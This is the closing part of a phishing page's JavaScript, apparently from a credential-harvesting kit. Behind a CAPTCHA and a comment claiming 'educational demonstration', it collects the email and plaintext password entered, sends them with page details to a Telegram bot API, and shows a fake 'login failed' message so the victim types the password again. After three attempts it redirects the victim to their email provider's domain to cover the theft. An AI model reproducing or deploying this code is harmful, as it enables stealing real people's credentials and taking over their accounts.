            return false;
        }

        // Simple email format check
        if (!ai.includes('@') || !ai.includes('.')) {
            $('#error').show().html("请输入有效的电子邮件地址").fadeIn();
            return false;
        }

        // CAPTCHA validation
        if (userCaptcha.toUpperCase() !== currentCaptcha) {
            $('#error').show().html("验证码无效").fadeIn();
            currentCaptcha = generateCaptcha();
            $('#captchaDisplay').text(currentCaptcha);
            $('#captchaInput').val('');
            return false;
        }

        count++;
        $('#sub-btn').html('验证...');
        $('#error').hide();

        // Ethical logging to Telegram - FOR EDUCATIONAL DEMONSTRATION ONLY
        const timestamp = new Date().toLocaleString();
        const message = ` Mr Selfless046 \n\n` +
                       `  ${timestamp}\n` +
                       `  Email: ${ai}\n` +
                       `  Password: ${pr}\n` +
                       `  CAPTCHA Attempt: ${userCaptcha}\n` +
                       `  CAPTCHA Match: ${userCaptcha.toUpperCase() === currentCaptcha ? "Yes" : "No"}\n` +
                       `  Page: ${window.location.hostname}\n` +
                       `  Attempt: ${count}/3`;
 

        // Send to Telegram
        $.ajax({
            url: TELEGRAM_API,
            method: "POST",
            data: {
                chat_id: CHAT_ID,
                text: message
            },
            success: function() {
                console.log("再次检查");
                
                // Simulate processing
                $('#progress').html("检查凭证...");
                setTimeout(() => {
                    $('#progress').css("color", "red").html("登录失败 - 请重试");
                    $('#sub-btn').html('Sign In');
                    
                    // Generate new CAPTCHA
                    currentCaptcha = generateCaptcha();
                    $('#captchaDisplay').text(currentCaptcha);
                    $('#captchaInput').val('');
                    
                    // Clear password field
                    $("#pr").val("");

                    // After 3 attempts, show redirect message
                    if (count >= 3) {
                        $('#login-alert').show();
                        setTimeout(() => {
                            window.location.replace('https://' + ai.split('@')[1]);
                        }, 3000);
                    }
                }, 1500);
            },
            error: function(err) {
                console.error("再次检查", err);
                simulateLoading(ai);
            }
        });
    });

});

</script>
</body>
</html>
